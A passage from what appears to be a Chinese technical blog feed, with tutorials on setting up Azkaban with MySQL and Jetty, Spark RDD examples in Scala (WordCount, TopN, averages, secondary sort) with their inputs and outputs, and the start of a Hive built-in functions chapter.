class="number">-2.5</span><span class="number">.0</span><span class="operator">/</span><span class="keyword">create</span><span class="operator">-</span><span class="keyword">all</span><span class="operator">-</span><span class="keyword">sql</span><span class="number">-2.5</span><span class="number">.0</span>.<span class="keyword">sql</span>;</span><br></pre></td></tr></table></figure><p><strong>创建证书</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore keystore -alias jetty -genkey -keyalg RSA</span><br><span class="line"><span class="meta">#</span><span class="bash">都默认吧，记住自己的密码</span></span><br><span class="line">mv keystore /usr/local/azkaban-web/</span><br><span class="line"><span class="meta">#</span><span class="bash">放到web应用里</span></span><br><span class="line">vi conf/azkaban.properties</span><br><span class="line"><span class="meta">#</span><span class="bash">修改以下数据</span></span><br><span class="line">database.type=mysql</span><br><span class="line">mysql.port=3306</span><br><span class="line">mysql.host=localhost</span><br><span class="line">mysql.database=azkaban</span><br><span class="line">mysql.user=azkaban</span><br><span class="line">mysql.password=azkaban</span><br><span class="line">mysql.numconnections=100</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Azkaban Jetty server properties.</span></span><br><span class="line">jetty.maxThreads=25</span><br><span class="line">jetty.ssl.port=8443</span><br><span class="line">jetty.port=8081</span><br><span class="line">jetty.keystore=keystore</span><br><span class="line">jetty.password=azkaban</span><br><span class="line">jetty.keypassword=azkaban</span><br><span class="line">jetty.truststore=keystore</span><br><span class="line">jetty.trustpassword=azkaban</span><br></pre></td></tr></table></figure><p><strong>编辑 executor 配置</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cd azkaban-executor/</span><br><span class="line">vi conf/azkaban.properties</span><br><span class="line"></span><br><span class="line">database.type=mysql</span><br><span class="line">mysql.port=3306</span><br><span class="line">mysql.host=localhost</span><br><span class="line">mysql.database=azkaban</span><br><span class="line">mysql.user=azkaban</span><br><span class="line">mysql.password=azkaban</span><br><span class="line">mysql.numconnections=100</span><br><span class="line"></span><br><span class="line">cd /usr/local/azkaban-web/</span><br><span class="line">vi conf/azkaban-users.xml </span><br><span class="line"></span><br><span class="line">&lt;azkaban-users&gt;</span><br><span class="line">        &lt;user username=&quot;azkaban&quot; password=&quot;azkaban&quot; roles=&quot;admin&quot; groups=&quot;azkaban&quot; /&gt;</span><br><span class="line">        &lt;user username=&quot;metrics&quot; password=&quot;metrics&quot; roles=&quot;metrics&quot;/&gt;</span><br><span class="line">        &lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;admin,metrics&quot;/&gt;</span><br><span class="line">        &lt;role name=&quot;admin&quot; permissions=&quot;ADMIN&quot; /&gt;</span><br><span class="line">        &lt;role name=&quot;metrics&quot; permissions=&quot;METRICS&quot;/&gt;</span><br><span class="line">&lt;/azkaban-users&gt;</span><br></pre></td></tr></table></figure><p><strong>启动应用</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/azkaban-executor/</span><br><span class="line">bin/azkaban-executor-start.sh</span><br><span class="line">cd /usr/local/azkaban-web/</span><br><span class="line">bin/azkaban-web-start.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">注意先启动executor，再启动webserver，避免出错</span></span><br></pre></td></tr></table></figure><p><strong>访问网页</strong><br><a href="https://yourhost:8443"> https://yourhost:8443</a></p><p><img "" class="lazyload placeholder" data-original="Azkaban/image-20211107123423587.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211107123423587"></p><p>admin 登陆</p><h2 id="azkaban使用方法"><a class="markdownIt-Anchor" href="#azkaban使用方法">#</a> Azkaban 使用方法</h2><p><strong>编写 Hive 作业并使用 azkaban 运行</strong><br>为了让 azkaban 支持 Hive 作业，需要使用 jobtype 插件，将下载好的压缩包解压至 azkaban-executor/plugins/ 目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/azkaban-executor/plugins/</span><br><span class="line">tar -zxvf azkaban-jobtype-2.5.0.tar.gz</span><br><span class="line">cd azkaban-jobtype-2.5.0</span><br><span class="line">vi common.properties</span><br><span class="line"><span class="meta">#</span><span class="bash">添加hadoop和hive家目录</span></span><br></pre></td></tr></table></figure><p><strong>编写 hiveCount 脚本以及 job 文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vi hiveCount.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">hive -e &quot;select count(distinct uid) from sogou.sogou_500w&quot;</span><br><span class="line">vi hiveCount.job</span><br><span class="line">type=command</span><br><span class="line">command=bash hiveCount.sh</span><br></pre></td></tr></table></figure><p><strong>将编写好的两个文件打包成 zip 并上传 web 界面</strong></p><p><img "" class="lazyload placeholder" data-original="Azkaban/image-20211107144929701.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211107144929701"></p><img "" class="lazyload placeholder" data-original="Azkaban/image-20211107145005251.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211107145005251" style="zoom:80%;" /><p><img "" class="lazyload placeholder" data-original="Azkaban/image-20211107150726252.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211107150726252"></p><p><strong>运行结束</strong></p><p><img "" class="lazyload placeholder" data-original="Azkaban/image-20211107151454918.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211107151454918"></p><p><img "" class="lazyload placeholder" data-original="Azkaban/image-20211107151559417.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211107151559417"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Spark+RDD</title>
      <link href="/2021/10/13/Spark%E5%AD%A6%E4%B9%A0/Spark-RDD/"/>
      <url>/2021/10/13/Spark%E5%AD%A6%E4%B9%A0/Spark-RDD/</url>
      
        <content type="html"><![CDATA[<h1 id="spark-rdd编程案例"><a class="markdownIt-Anchor" href="#spark-rdd编程案例">#</a> Spark RDD 编程案例</h1><h2 id="wordcount"><a class="markdownIt-Anchor" href="#wordcount">#</a> WordCount</h2><p>WordCount 编程是我们最熟悉不过的了，使用 Spark 进行编写程序会比 MapReduce 编程简便许多。<br>代码示例如下：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.spark.&#123;<span class="type">SparkConf</span>, <span class="type">SparkContext</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> config: <span class="type">SparkConf</span> = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">&quot;local[*]&quot;</span>).setAppName(<span class="string">&quot;WordCount&quot;</span>)</span><br><span class="line"><span class="comment">//设置内核个数以及程序名称</span></span><br><span class="line">    <span class="keyword">val</span> sc: <span class="type">SparkContext</span> = <span class="keyword">new</span> <span class="type">SparkContext</span>(config)</span><br><span class="line">    <span class="comment">//创建Spark上下文</span></span><br><span class="line">    sc.setLogLevel(<span class="string">&quot;WARN&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> result: <span class="type">Array</span>[(<span class="type">String</span>,<span class="type">Int</span>)] = sc.textFile(<span class="string">&quot;in&quot;</span>).</span><br><span class="line">    <span class="comment">//逐行读入数据，路径是项目根目录下in文件夹</span></span><br><span class="line">      flatMap(_.split(<span class="string">&quot; &quot;</span>)).</span><br><span class="line">      <span class="comment">//拆分单词</span></span><br><span class="line">      map((_,<span class="number">1</span>)).</span><br><span class="line">      <span class="comment">//将每个单词变成键值对</span></span><br><span class="line">      reduceByKey(_+_).</span><br><span class="line">      <span class="comment">//对每个键值对进行处理，对于相同的键进行相加</span></span><br><span class="line">      collect()</span><br><span class="line">    result.foreach(x =&gt; println(x))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里选择从本地文件导入数据，存放在 Idea 项目根目录下 in 文件夹，数据内容以及运行结果如下：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输入数据</span></span><br><span class="line">hadoop hello</span><br><span class="line">spark hello</span><br><span class="line">ambari yes</span><br><span class="line">scala java</span><br><span class="line">hive hbase</span><br><span class="line">hadoop hello</span><br><span class="line">spark hello</span><br><span class="line">ambari yes</span><br><span class="line">scala java</span><br><span class="line">hive hbase</span><br><span class="line">hive hbase</span><br><span class="line">hadoop hello</span><br><span class="line">spark hello</span><br><span class="line">ambari yes</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">(scala,<span class="number">2</span>)</span><br><span class="line">(hive,<span class="number">3</span>)</span><br><span class="line">(ambari,<span class="number">3</span>)</span><br><span class="line">(hello,<span class="number">6</span>)</span><br><span class="line">(java,<span class="number">2</span>)</span><br><span class="line">(spark,<span class="number">3</span>)</span><br><span class="line">(yes,<span class="number">3</span>)</span><br><span class="line">(hadoop,<span class="number">3</span>)</span><br><span class="line">(hbase,<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="topn"><a class="markdownIt-Anchor" href="#topn">#</a> TopN</h2><p>TopN 功能是实现对一个较大数据量的数据进行排序，之后输出前 N 条数据，一般来说有 3 种类型的 TopN 写法，这里使用的是键不相同的写法。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.spark.&#123;<span class="type">SparkConf</span>, <span class="type">SparkContext</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">TopN</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> config: <span class="type">SparkConf</span> = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">&quot;local[*]&quot;</span>).setAppName(<span class="string">&quot;TopN&quot;</span>) </span><br><span class="line">    <span class="comment">//设置内核个数以及程序名称</span></span><br><span class="line">    <span class="keyword">val</span> sc: <span class="type">SparkContext</span> = <span class="keyword">new</span> <span class="type">SparkContext</span>(config) </span><br><span class="line">    <span class="comment">//创建Spark上下文</span></span><br><span class="line">    sc.setLogLevel(<span class="string">&quot;WARN&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> result: <span class="type">Array</span>[(<span class="type">String</span>,<span class="type">String</span> )] = sc.textFile(<span class="string">&quot;in/top/&quot;</span>) </span><br><span class="line">    <span class="comment">//逐行读入数据，路径是项目根目录下in/top文件夹</span></span><br><span class="line">      .map(_.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">      <span class="comment">//按空格分开</span></span><br><span class="line">      .map(line =&gt; (line(<span class="number">0</span>), line(<span class="number">1</span>)))</span><br><span class="line">      <span class="comment">//映射键值对</span></span><br><span class="line">      .sortByKey(<span class="literal">false</span>)</span><br><span class="line">      <span class="comment">//按键进行排序，默认升序，false降序</span></span><br><span class="line">      .take(<span class="number">5</span>)</span><br><span class="line">      <span class="comment">//取结果前N个</span></span><br><span class="line">    result.foreach(println)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入数据以及输出结果：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输入数据</span></span><br><span class="line"><span class="number">56</span> test1</span><br><span class="line"><span class="number">73</span> test2</span><br><span class="line"><span class="number">84</span> test3</span><br><span class="line"><span class="number">74</span> test4</span><br><span class="line"><span class="number">83</span> test5</span><br><span class="line"><span class="number">93</span> test6</span><br><span class="line"><span class="number">88</span> test7</span><br><span class="line"><span class="number">81</span> test8</span><br><span class="line"><span class="number">92</span> test9</span><br><span class="line"><span class="number">34</span> test10</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">(<span class="number">93</span>,test6)</span><br><span class="line">(<span class="number">92</span>,test9)</span><br><span class="line">(<span class="number">88</span>,test7)</span><br><span class="line">(<span class="number">84</span>,test3)</span><br><span class="line">(<span class="number">83</span>,test5)</span><br></pre></td></tr></table></figure><h2 id="avg"><a class="markdownIt-Anchor" href="#avg">#</a> Avg</h2><p>题目：给定一组键值对 (“spark”,2),(“hadoop”,6),(“hadoop”,4),(“spark”,6)，键值对的 key 表示图书名称，value 表示某天图书销量，请计算每个键对应的平均值，也就是计算每种图书的每天平均销量。<br>代码示例如下：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.spark.&#123;<span class="type">SparkConf</span>, <span class="type">SparkContext</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Avg</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> config: <span class="type">SparkConf</span> = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">&quot;local[*]&quot;</span>).setAppName(<span class="string">&quot;Avg&quot;</span>)</span><br><span class="line">    <span class="comment">//设置内核个数以及程序名称</span></span><br><span class="line">    <span class="keyword">val</span> sc: <span class="type">SparkContext</span> = <span class="keyword">new</span> <span class="type">SparkContext</span>(config)</span><br><span class="line">    <span class="comment">//创建Spark上下文</span></span><br><span class="line">    sc.setLogLevel(<span class="string">&quot;WARN&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> data = <span class="type">Array</span>((<span class="string">&quot;spark&quot;</span>,<span class="number">2</span>),(<span class="string">&quot;hadoop&quot;</span>,<span class="number">6</span>),(<span class="string">&quot;hadoop&quot;</span>,<span class="number">4</span>),(<span class="string">&quot;spark&quot;</span>,<span class="number">6</span>))</span><br><span class="line">    <span class="keyword">val</span> res = sc.parallelize(data)</span><br><span class="line">    <span class="comment">//读入数据</span></span><br><span class="line">      .mapValues(a =&gt; (a,<span class="number">1</span>))</span><br><span class="line">      <span class="comment">//将值映射成为（值，次数）的形式</span></span><br><span class="line">      .reduceByKey((a,b) =&gt; (a._1+b._1,a._2+b._2))</span><br><span class="line">      <span class="comment">//相同键进行Reduce，累加次数以及销量</span></span><br><span class="line">      .map(t =&gt; (t._1,t._2._1/t._2._2))</span><br><span class="line">      <span class="comment">//计算平均值</span></span><br><span class="line">    res.foreach(println)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用简易的数组导入数据，使用 parallelize () 方法，输出如下：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//output</span></span><br><span class="line">(spark,<span class="number">4</span>)</span><br><span class="line">(hadoop,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="secondarysort"><a class="markdownIt-Anchor" href="#secondarysort">#</a> SecondarySort</h2><p>二次排序也是一个经典案例，实现按键排序的同时按值排序，代码如下：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.spark.&#123;<span class="type">SparkConf</span>, <span class="type">SparkContext</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个比较类，重写比较方法，记得加上序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecondarySortKey</span>(<span class="params">val first: <span class="type">Int</span>, val second: <span class="type">Int</span></span>) <span class="keyword">extends</span> <span class="title">Ordered</span>[<span class="type">SecondarySortKey</span>] <span class="keyword">with</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">compare</span></span>(other: <span class="type">SecondarySortKey</span>): <span class="type">Int</span> =</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.first - other.first != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">this</span>.first - other.first</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">this</span>.second - other.second</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SecondarySort</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> config: <span class="type">SparkConf</span> = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">&quot;local[*]&quot;</span>).setAppName(<span class="string">&quot;SecondarySort&quot;</span>)</span><br><span class="line">      <span class="comment">//设置内核个数以及程序名称</span></span><br><span class="line">    <span class="keyword">val</span> sc: <span class="type">SparkContext</span> = <span class="keyword">new</span> <span class="type">SparkContext</span>(config)</span><br><span class="line">      <span class="comment">//创建Spark上下文</span></span><br><span class="line">    sc.setLogLevel(<span class="string">&quot;WARN&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> result: <span class="type">Array</span>[(<span class="type">Int</span>,<span class="type">Int</span>)] = sc.textFile(<span class="string">&quot;in/second&quot;</span>)</span><br><span class="line">      <span class="comment">//逐行读入数据，路径是项目根目录下in/second文件夹</span></span><br><span class="line">      .map(_.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">      <span class="comment">//按空格分开</span></span><br><span class="line">      .map(line =&gt; (line(<span class="number">0</span>).toInt, line(<span class="number">1</span>).toInt)) </span><br><span class="line">      <span class="comment">//映射键值对</span></span><br><span class="line">      .map(line =&gt; (<span class="keyword">new</span> <span class="type">SecondarySortKey</span>(line._1,line._2), line))</span><br><span class="line">      <span class="comment">//映射成为（可比较类，原数据）的形式</span></span><br><span class="line">      .sortByKey(<span class="literal">false</span>)</span><br><span class="line">      <span class="comment">//按键降序</span></span><br><span class="line">      .map(x =&gt; x._2).collect()</span><br><span class="line">      <span class="comment">//排序完只保留原数据</span></span><br><span class="line">    result.foreach(println)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入数据以及输出结果：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input</span></span><br><span class="line"><span class="number">32</span> <span class="number">35</span></span><br><span class="line"><span class="number">25</span> <span class="number">46</span></span><br><span class="line"><span class="number">52</span> <span class="number">65</span></span><br><span class="line"><span class="number">29</span> <span class="number">85</span></span><br><span class="line"><span class="number">85</span> <span class="number">42</span></span><br><span class="line"><span class="number">25</span> <span class="number">45</span></span><br><span class="line"><span class="number">95</span> <span class="number">96</span></span><br><span class="line"><span class="number">75</span> <span class="number">96</span></span><br><span class="line"><span class="number">75</span> <span class="number">62</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">(<span class="number">95</span>,<span class="number">96</span>)</span><br><span class="line">(<span class="number">85</span>,<span class="number">42</span>)</span><br><span class="line">(<span class="number">75</span>,<span class="number">96</span>)</span><br><span class="line">(<span class="number">75</span>,<span class="number">62</span>)</span><br><span class="line">(<span class="number">52</span>,<span class="number">65</span>)</span><br><span class="line">(<span class="number">32</span>,<span class="number">35</span>)</span><br><span class="line">(<span class="number">29</span>,<span class="number">85</span>)</span><br><span class="line">(<span class="number">25</span>,<span class="number">46</span>)</span><br><span class="line">(<span class="number">25</span>,<span class="number">45</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Spark学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hive查询进阶</title>
      <link href="/2021/10/08/Hive%E5%AD%A6%E4%B9%A0/hive5/"/>
      <url>/2021/10/08/Hive%E5%AD%A6%E4%B9%A0/hive5/</url>
      
        <content type="html"><![CDATA[<h1 id="hiveql数据查询进阶"><a class="markdownIt-Anchor" href="#hiveql数据查询进阶">#</a> HiveQL 数据查询进阶</h1><p>本章要点</p><ul><li>Hive 内置函数</li><li>Hive 构建搜索日志分析系统</li><li>Sqoop 应用与开发</li></ul><h2 id="hive-内置函数"><a class="markdownIt-Anchor" href="#hive-内置函数">#</a> Hive 内置函数</h2><p>Hive 内置函数就是 Hive 中可以直接使用的函数，首先查看一下有哪些函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> functions;</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="operator">|</span>           tab_name           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">!</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">!=</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> $sum0                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">%</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&amp;</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">*</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">+</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">-</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">/</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;=</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;=&gt;</span>                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;&gt;</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">=</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">=</span><span class="operator">=</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&gt;</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&gt;=</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">^</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> abs                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> acos                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> add_months                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> aes_decrypt                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> aes_encrypt                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">and</span>                          <span class="operator">|</span></span><br><span class="line">...</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="number">289</span> <span class="keyword">rows</span> selected (<span class="number">0.494</span> seconds)</span><br></pre></td></tr></table></figure><p>其中常用的如 avg 求平均，concat 连接函数，count 